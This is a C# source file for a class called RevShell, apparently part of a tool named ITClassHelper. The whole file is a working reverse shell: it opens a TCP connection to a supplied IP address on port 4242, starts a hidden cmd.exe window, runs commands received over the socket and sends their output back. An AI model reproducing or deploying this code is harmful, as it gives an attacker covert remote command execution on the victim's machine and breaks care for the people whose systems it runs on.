using System.Diagnostics;
using System.IO;
using System.Net.Sockets;
using System.Text;

namespace ITClassHelper
{
    internal class RevShell
    {
        static StreamWriter sw;

        public static void Reverse(string ip)
        {
            using (TcpClient client = new TcpClient(ip, 4242))
            {
                using (Stream s = client.GetStream())
                {
                    using (StreamReader sr = new StreamReader(s))
                    {
                        sw = new StreamWriter(s);
                        StringBuilder str = new StringBuilder();
                        Process p = new Process();
                        p.StartInfo.FileName = "cmd.exe";
                        p.StartInfo.CreateNoWindow = true;
                        p.StartInfo.UseShellExecute = false;
                        p.StartInfo.RedirectStandardOutput = true;
                        p.StartInfo.RedirectStandardInput = true;
                        p.StartInfo.RedirectStandardError = true;
                        p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
                        p.Start();
                        p.BeginOutputReadLine();
                        while (true)
                        {
                            str.Append(sr.ReadLine());
                            p.StandardInput.WriteLine(str);
                            str.Remove(0, str.Length);
                        }
                    }
                }
            }
        }

        public static void CmdOutputDataHandler(object sender, DataReceivedEventArgs e)
        {
            StringBuilder strOutput = new StringBuilder();
            if (!string.IsNullOrEmpty(e.Data))
            {
                try
                {
                    strOutput.Append(e.Data);
                    sw.WriteLine(strOutput);
                    sw.Flush();
                }
                catch { }
            }
        }
    }
}
